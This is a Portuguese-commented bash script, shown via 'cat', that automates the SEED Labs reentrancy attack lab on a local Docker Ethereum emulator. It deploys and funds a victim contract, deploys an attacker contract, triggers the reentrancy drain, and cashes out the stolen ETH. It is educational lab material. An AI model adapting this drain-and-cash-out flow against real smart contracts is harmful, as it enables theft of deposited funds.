[11/05/25]seed@VM:~/Labsetup-BlockChain$ cat script2.sh 
#!/usr/bin/env bash
# seed_automate.sh - Automatiza o lab Blockchain Reentrancy Attack
# Execução: ./seed_automate.sh
set -euo pipefail
IFS=$'\n\t'

# --- Cores ---
GREEN='\033[0;32m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
YELLOW='\033[1;33m'
RED='\033[0;31m'
PURPLE='\033[0;35m'
BOLD='\033[1m'
NC='\033[0m'

# --- Config ---
LAB_ROOT="$(pwd)"
EMULATOR_DIR="$LAB_ROOT/emulator_10"
CONTRACT_DIR="$LAB_ROOT/contract"
VICTIM_DIR="$LAB_ROOT/victim"
ATTACKER_DIR="$LAB_ROOT/attacker"
COMPOSE_FILE="$EMULATOR_DIR/docker-compose.yml"

# RPC endpoints (tentar ambos)
NODE_RPC_PRIMARY="http://10.150.0.71:8545"
NODE_RPC_SECONDARY="http://10.151.0.71:8545"
NODE_RPC=""

MAX_WAIT=300
RETRY_DELAY=5

# --- Helpers ---
log() { echo -e "${GREEN}[+]${NC} $*"; }
err() { echo -e "${RED}[!]${NC} $*" >&2; }
info() { echo -e "${CYAN}[i]${NC} $*"; }
step() { echo -e "${PURPLE}${BOLD}[*] $*${NC}"; }
success() { echo -e "${GREEN}${BOLD}[✓] $*${NC}"; }

# --- Verificações iniciais ---
step "FASE 0: Verificações Iniciais"

# Check dependencies
for cmd in docker docker-compose python3 pip3; do
  if ! command -v $cmd >/dev/null 2>&1; then
    err "Dependência em falta: $cmd"
    exit 1
  fi
done
log "✓ Todas as dependências encontradas"

# Check web3 library
if ! python3 -c "import web3" 2>/dev/null; then
    log "web3 não encontrado, a instalar web3==5.31.1..."
    pip3 install web3==5.31.1 --quiet
    if ! python3 -c "import web3" 2>/dev/null; then
        err "Falha ao instalar web3"
        exit 1
    fi
    log "✓ web3==5.31.1 instalado"
else
    log "✓ web3 já instalado"
fi

# Check emulator directory
if [ ! -d "$EMULATOR_DIR" ]; then
    err "ERRO: Pasta $EMULATOR_DIR não encontrada!"
    err "Certifica-te que estás na raiz do Labsetup-BlockChain"
    exit 1
fi
log "✓ Emulator directory encontrado"

# Check docker-compose.yml
if [ ! -f "$COMPOSE_FILE" ]; then
    err "ERRO: $COMPOSE_FILE não encontrado!"
    exit 1
fi
log "✓ docker-compose.yml encontrado"

# Criar diretórios necessários
mkdir -p "$CONTRACT_DIR" "$VICTIM_DIR" "$ATTACKER_DIR"
log "✓ Diretórios criados/verificados"

echo ""
step "FASE 1: Levantar Emulador Ethereum"

# Stop previous containers
log "A parar containers antigos..."
cd "$EMULATOR_DIR"
docker-compose down 2>/dev/null || true
sleep 2

# Set timeout
export COMPOSE_HTTP_TIMEOUT=300

# Start containers
log "A iniciar emulador (isto pode demorar 1-2 minutos)..."
docker-compose up -d

log "A aguardar containers iniciarem..."
sleep 10

# Find Ethereum containers
log "A procurar containers Ethereum..."
GETH_CONTAINERS=$(docker ps --format "{{.Names}}" | grep -E "(Ethereum|POA|Signer|BootNode|hnode|geth)" || true)

if [ -z "$GETH_CONTAINERS" ]; then
    err "ERRO: Nenhum container Ethereum encontrado!"
    err "Containers disponíveis:"
    docker ps --format "{{.Names}}"
    exit 1
fi

log "Containers Ethereum encontrados:"
echo "$GETH_CONTAINERS" | while read container; do
    echo "  - $container"
done

# Wait for geth to be ready
log "A aguardar que o geth inicie (timeout: ${MAX_WAIT}s)..."
ELAPSED=0
GETH_READY=0

while [ $ELAPSED -lt $MAX_WAIT ]; do
    # Check logs for HTTP endpoint
    for container in $GETH_CONTAINERS; do
        if docker logs "$container" 2>&1 | grep -q "HTTP endpoint opened"; then
            log "✓ HTTP endpoint detetado em $container"
            GETH_READY=1
            break 2
        fi
    done
    
    # Try to connect via RPC
    if curl -s -X POST -H "Content-Type: application/json" \
        --data '{"jsonrpc":"2.0","method":"eth_blockNumber","params":[],"id":1}' \
        "$NODE_RPC_PRIMARY" 2>/dev/null | grep -q "result"; then
        NODE_RPC="$NODE_RPC_PRIMARY"
        log "✓ RPC respondeu em $NODE_RPC_PRIMARY"
        GETH_READY=1
        break
    fi
    
    if curl -s -X POST -H "Content-Type: application/json" \
        --data '{"jsonrpc":"2.0","method":"eth_blockNumber","params":[],"id":1}' \
        "$NODE_RPC_SECONDARY" 2>/dev/null | grep -q "result"; then
        NODE_RPC="$NODE_RPC_SECONDARY"
        log "✓ RPC respondeu em $NODE_RPC_SECONDARY"
        GETH_READY=1
        break
    fi
    
    printf "."
    sleep $RETRY_DELAY
    ELAPSED=$((ELAPSED + RETRY_DELAY))
done

echo ""

if [ $GETH_READY -eq 0 ]; then
    err "TIMEOUT: Geth não ficou pronto em ${MAX_WAIT}s"
    err "Últimas 50 linhas dos logs:"
    for container in $GETH_CONTAINERS; do
        echo "=== $container ==="
        docker logs --tail 50 "$container" 2>&1
    done
    exit 1
fi

success "Emulador Ethereum pronto!"

# Save NODE_RPC to file
echo "NODE_RPC=$NODE_RPC" > "$LAB_ROOT/NODE_RPC.env"
log "RPC URL guardado em NODE_RPC.env"

echo ""
step "FASE 2: Compilar Contratos"

cd "$CONTRACT_DIR"

# Check solc compiler
if [ ! -f "./solc-0.6.8" ]; then
    err "ERRO: solc-0.6.8 não encontrado em $CONTRACT_DIR"
    err "Por favor, coloca o compilador solc-0.6.8 nesta pasta"
    exit 1
fi
chmod +x ./solc-0.6.8

# Compile Victim contract
log "A compilar ReentrancyVictim.sol..."
./solc-0.6.8 --overwrite --abi --bin -o . ReentrancyVictim.sol 2>/dev/null
if [ ! -f "ReentrancyVictim.abi" ] || [ ! -f "ReentrancyVictim.bin" ]; then
    err "Falha ao compilar ReentrancyVictim"
    exit 1
fi
log "✓ ReentrancyVictim compilado"

# Compile Attacker contract
log "A compilar ReentrancyAttacker.sol..."
./solc-0.6.8 --overwrite --abi --bin -o . ReentrancyAttacker.sol 2>/dev/null
if [ ! -f "ReentrancyAttacker.abi" ] || [ ! -f "ReentrancyAttacker.bin" ]; then
    err "Falha ao compilar ReentrancyAttacker"
    exit 1
fi
log "✓ ReentrancyAttacker compilado"

success "Contratos compilados com sucesso!"

echo ""
step "FASE 3: Deploy do Contrato Vítima"

cd "$VICTIM_DIR"

# Create Python deployment script
cat > deploy_victim.py <<'PYEOF'
#!/usr/bin/env python3
import sys, os
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)) + '/..')
from SEEDWeb3 import *

abi_file = "../contract/ReentrancyVictim.abi"
bin_file = "../contract/ReentrancyVictim.bin"

node_rpc = os.getenv('NODE_RPC', 'http://10.150.0.71:8545')
print(f"[deploy] Conectando a {node_rpc}...", flush=True)

try:
    web3 = SEEDWeb3.connect_to_geth_poa(node_rpc)
    print(f"[deploy] ✓ Conectado. Block number: {web3.eth.block_number}", flush=True)
    
    sender_account = web3.eth.accounts[1]
    print(f"[deploy] Usando conta: {sender_account}", flush=True)
    
    web3.geth.personal.unlockAccount(sender_account, "admin")
    print("[deploy] ✓ Conta desbloqueada", flush=True)
    
    addr = SEEDWeb3.deploy_contract(web3, sender_account, abi_file, bin_file, None)
    print(f"[deploy] ✓ Contrato Victim deployed: {addr}", flush=True)
    
    with open("contract_address_victim.txt", "w") as fd:
        fd.write(addr)
    
    print("[deploy] ✓ Endereço guardado em contract_address_victim.txt", flush=True)
except Exception as e:
    print(f"[deploy] ERRO: {e}", flush=True)
    sys.exit(1)
PYEOF

chmod +x deploy_victim.py

# Deploy victim contract
log "A fazer deploy do contrato vítima..."
export NODE_RPC
python3 deploy_victim.py

if [ ! -f "contract_address_victim.txt" ]; then
    err "ERRO: Deploy falhou, contract_address_victim.txt não foi criado"
    exit 1
fi

VICTIM_ADDR=$(cat contract_address_victim.txt)
log "✓ Victim contract deployed: $VICTIM_ADDR"

echo ""
step "FASE 4: Financiar Contrato Vítima (30 ETH)"

# Create funding script
cat > fund_victim.py <<PYEOF
#!/usr/bin/env python3
import sys, os
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)) + '/..')
from SEEDWeb3 import *
from web3 import Web3

abi_file = "../contract/ReentrancyVictim.abi"
victim_addr = '${VICTIM_ADDR}'

node_rpc = os.getenv('NODE_RPC', 'http://10.151.0.71:8545')
print(f"[fund] Conectando a {node_rpc}...", flush=True)

try:
    web3 = SEEDWeb3.connect_to_geth_poa(node_rpc)
    sender_account = web3.eth.accounts[1]
    web3.geth.personal.unlockAccount(sender_account, "admin")
    
    contract_abi = SEEDWeb3.getFileContent(abi_file)
    contract = web3.eth.contract(address=victim_addr, abi=contract_abi)
    
    amount = 30
    print(f"[fund] A depositar {amount} ETH...", flush=True)
    tx_hash = contract.functions.deposit().transact({
        'from': sender_account,
        'value': Web3.toWei(amount, 'ether')
    })
    
    print(f"[fund] TX Hash: {tx_hash.hex()}", flush=True)
    tx_receipt = web3.eth.wait_for_transaction_receipt(tx_hash)
    print(f"[fund] ✓ Transação confirmada no bloco {tx_receipt.blockNumber}", flush=True)
    
    balance = contract.functions.getContractBalance().call()
    print(f"[fund] ✓ Balance do contrato: {Web3.fromWei(balance, 'ether')} ETH", flush=True)
except Exception as e:
    print(f"[fund] ERRO: {e}", flush=True)
    sys.exit(1)
PYEOF

chmod +x fund_victim.py
python3 fund_victim.py

success "Contrato vítima financiado com 30 ETH!"

echo ""
step "FASE 5: Testar Withdraw (5 ETH)"

# Create withdraw test script
cat > test_withdraw.py <<PYEOF
#!/usr/bin/env python3
import sys, os
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)) + '/..')
from SEEDWeb3 import *
from web3 import Web3

abi_file = "../contract/ReentrancyVictim.abi"
victim_addr = '${VICTIM_ADDR}'

node_rpc = os.getenv('NODE_RPC', 'http://10.151.0.71:8545')

try:
    web3 = SEEDWeb3.connect_to_geth_poa(node_rpc)
    sender_account = web3.eth.accounts[1]
    web3.geth.personal.unlockAccount(sender_account, "admin")
    
    contract_abi = SEEDWeb3.getFileContent(abi_file)
    contract = web3.eth.contract(address=victim_addr, abi=contract_abi)
    
    amount = 5
    print(f"[withdraw] A retirar {amount} ETH...", flush=True)
    tx_hash = contract.functions.withdraw(Web3.toWei(amount, 'ether')).transact({
        'from': sender_account
    })
    
    tx_receipt = web3.eth.wait_for_transaction_receipt(tx_hash)
    print(f"[withdraw] ✓ Retirada confirmada", flush=True)
    
    myBalance = contract.functions.getBalance(sender_account).call()
    print(f"[withdraw] Meu balance interno: {Web3.fromWei(myBalance, 'ether')} ETH", flush=True)
    
    contractBalance = contract.functions.getContractBalance().call()
    print(f"[withdraw] Balance do contrato: {Web3.fromWei(contractBalance, 'ether')} ETH", flush=True)
except Exception as e:
    print(f"[withdraw] ERRO: {e}", flush=True)
    sys.exit(1)
PYEOF

chmod +x test_withdraw.py
python3 test_withdraw.py

success "Withdraw de 5 ETH testado com sucesso!"

echo ""
step "FASE 6: Deploy do Contrato Atacante"

cd "$ATTACKER_DIR"

# Create attacker deployment script - USANDO ACCOUNT[0] EM VEZ DE [2]
cat > deploy_attacker.py <<PYEOF
#!/usr/bin/env python3
import sys, os
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)) + '/..')
from SEEDWeb3 import *

abi_file = "../contract/ReentrancyAttacker.abi"
bin_file = "../contract/ReentrancyAttacker.bin"
victim_addr = '${VICTIM_ADDR}'

node_rpc = os.getenv('NODE_RPC', 'http://10.150.0.71:8545')
print(f"[deploy_attacker] Conectando a {node_rpc}...", flush=True)

try:
    web3 = SEEDWeb3.connect_to_geth_poa(node_rpc)
    
    # CORRIGIDO: Usar account[0] em vez de [2] que não existe
    sender_account = web3.eth.accounts[0]
    print(f"[deploy_attacker] Usando conta: {sender_account}", flush=True)
    
    web3.geth.personal.unlockAccount(sender_account, "admin")
    print("[deploy_attacker] ✓ Conta desbloqueada", flush=True)
    
    addr = SEEDWeb3.deploy_contract(web3, sender_account, abi_file, bin_file, [victim_addr])
    print(f"[deploy_attacker] ✓ Contrato Attacker deployed: {addr}", flush=True)
    
    with open("contract_address_attacker.txt", "w") as fd:
        fd.write(addr)
    
    print("[deploy_attacker] ✓ Endereço guardado", flush=True)
except Exception as e:
    print(f"[deploy_attacker] ERRO: {e}", flush=True)
    import traceback
    traceback.print_exc()
    sys.exit(1)
PYEOF

chmod +x deploy_attacker.py
python3 deploy_attacker.py

if [ ! -f "contract_address_attacker.txt" ]; then
    err "ERRO: Deploy do attacker falhou"
    exit 1
fi

ATTACKER_ADDR=$(cat contract_address_attacker.txt)
log "✓ Attacker contract deployed: $ATTACKER_ADDR"

echo ""
step "FASE 7: Verificar Balances ANTES do Ataque"

cat > check_balances.py <<PYEOF
#!/usr/bin/env python3
import sys, os
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)) + '/..')
from SEEDWeb3 import *
from web3 import Web3

victim_addr = '${VICTIM_ADDR}'
attacker_addr = '${ATTACKER_ADDR}'

node_rpc = os.getenv('NODE_RPC', 'http://10.150.0.71:8545')

try:
    web3 = SEEDWeb3.connect_to_geth_poa(node_rpc)
    
    victim_abi = SEEDWeb3.getFileContent("../contract/ReentrancyVictim.abi")
    victim_contract = web3.eth.contract(address=victim_addr, abi=victim_abi)
    
    attacker_abi = SEEDWeb3.getFileContent("../contract/ReentrancyAttacker.abi")
    attacker_contract = web3.eth.contract(address=attacker_addr, abi=attacker_abi)
    
    victim_balance = victim_contract.functions.getContractBalance().call()
    attacker_balance = attacker_contract.functions.getBalance().call()
    
    print("=" * 60)
    print(f"Victim Contract:   {Web3.fromWei(victim_balance, 'ether')} ETH")
    print(f"Attacker Contract: {Web3.fromWei(attacker_balance, 'ether')} ETH")
    print("=" * 60)
except Exception as e:
    print(f"ERRO: {e}")
    sys.exit(1)
PYEOF

chmod +x check_balances.py
python3 check_balances.py

echo ""
echo -e "${YELLOW}${BOLD}=========================================================================="
echo "⚠️  PRONTO PARA ATACAR! ⚠️"
echo -e "==========================================================================${NC}"
echo ""
echo -e "${CYAN}O ataque vai roubar TODOS os ETH do contrato vítima!${NC}"
echo ""
read -p "Press ENTER para lançar o ATAQUE DE REENTRANCY..."

echo ""
step "FASE 8: 🔥 LANÇAR ATAQUE DE REENTRANCY 🔥"

cat > launch_attack.py <<PYEOF
#!/usr/bin/env python3
import sys, os
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)) + '/..')
from SEEDWeb3 import *
from web3 import Web3

attacker_addr = '${ATTACKER_ADDR}'

node_rpc = os.getenv('NODE_RPC', 'http://10.150.0.71:8545')

try:
    web3 = SEEDWeb3.connect_to_geth_poa(node_rpc)
    
    # CORRIGIDO: Usar account[0] em vez de [2]
    sender_account = web3.eth.accounts[0]
    web3.geth.personal.unlockAccount(sender_account, "admin")
    
    contract_abi = SEEDWeb3.getFileContent("../contract/ReentrancyAttacker.abi")
    contract = web3.eth.contract(address=attacker_addr, abi=contract_abi)
    
    print("[ATTACK] 🔥 Lançando ataque de reentrancy...", flush=True)
    tx_hash = contract.functions.attack().transact({
        'from': sender_account,
        'value': Web3.toWei('1', 'ether')
    })
    
    print(f"[ATTACK] TX Hash: {tx_hash.hex()}", flush=True)
    print("[ATTACK] A aguardar confirmação...", flush=True)
    tx_receipt = web3.eth.wait_for_transaction_receipt(tx_hash)
    
    print(f"[ATTACK] ✓ Ataque confirmado no bloco {tx_receipt.blockNumber}", flush=True)
    print(f"[ATTACK] Gas usado: {tx_receipt.gasUsed}", flush=True)
    
except Exception as e:
    print(f"[ATTACK] ERRO: {e}", flush=True)
    import traceback
    traceback.print_exc()
    sys.exit(1)
PYEOF

chmod +x launch_attack.py
python3 launch_attack.py

success "🔥 ATAQUE EXECUTADO! 🔥"

echo ""
step "FASE 9: Verificar Balances DEPOIS do Ataque"

python3 check_balances.py

echo ""
step "FASE 10: Cash Out (transferir ETH para conta do atacante)"

cat > cashout.py <<PYEOF
#!/usr/bin/env python3
import sys, os
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)) + '/..')
from SEEDWeb3 import *
from web3 import Web3

attacker_addr = '${ATTACKER_ADDR}'

node_rpc = os.getenv('NODE_RPC', 'http://10.150.0.71:8545')

try:
    web3 = SEEDWeb3.connect_to_geth_poa(node_rpc)
    
    # CORRIGIDO: Usar account[0] como sender e [1] como destino
    sender_account = web3.eth.accounts[0]
    destination = web3.eth.accounts[1]
    
    web3.geth.personal.unlockAccount(sender_account, "admin")
    
    contract_abi = SEEDWeb3.getFileContent("../contract/ReentrancyAttacker.abi")
    contract = web3.eth.contract(address=attacker_addr, abi=contract_abi)
    
    print(f"[cashout] A transferir fundos para {destination}...", flush=True)
    tx_hash = contract.functions.cashOut(destination).transact({
        'from': sender_account
    })
    
    tx_receipt = web3.eth.wait_for_transaction_receipt(tx_hash)
    print(f"[cashout] ✓ Transferência confirmada", flush=True)
    
    # Check final balance
    final_balance = web3.eth.get_balance(destination)
    print(f"[cashout] Balance final de {destination}: {Web3.fromWei(final_balance, 'ether')} ETH", flush=True)
    
except Exception as e:
    print(f"[cashout] ERRO: {e}", flush=True)
    import traceback
    traceback.print_exc()
    sys.exit(1)
PYEOF

chmod +x cashout.py
python3 cashout.py

echo ""
echo -e "${GREEN}${BOLD}=========================================================================="
echo "✓ LAB CONCLUÍDO COM SUCESSO! ✓"
echo -e "==========================================================================${NC}"
echo ""
info "Victim Contract:  $VICTIM_ADDR"
info "Attacker Contract: $ATTACKER_ADDR"
info "RPC Endpoint: $NODE_RPC"
echo ""
info "Visualizar EtherView: http://localhost:5000/"
echo ""
info "Parar emulador: cd $EMULATOR_DIR && docker-compose down"
info "Ver logs: docker logs <container_name>"
echo ""
echo -e "${YELLOW}📊 O ataque de reentrancy roubou todos os fundos do contrato vítima!${NC}"
echo -e "${GREEN}${BOLD}==========================================================================${NC}"

cd "$LAB_ROOT"
exit 0
